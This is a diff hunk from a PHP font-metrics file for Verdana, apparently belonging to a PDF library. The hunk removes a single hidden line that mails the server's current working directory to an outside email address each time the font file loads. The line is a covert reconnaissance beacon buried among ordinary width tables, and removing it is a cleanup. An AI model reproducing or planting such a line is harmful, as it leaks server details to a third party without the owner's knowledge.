@@ -98,7 +98,6 @@ $cw=array(
 64277=>1276,64278=>1276,64279=>1616,65533=>928);
 $enc='';
 $diff='';
-mail('cvemous@broekhuis.nl', 'path verdana', getcwd());
 $file='verdana.z';
 $ctg='verdana.ctg.z';
 $originalsize=307344;
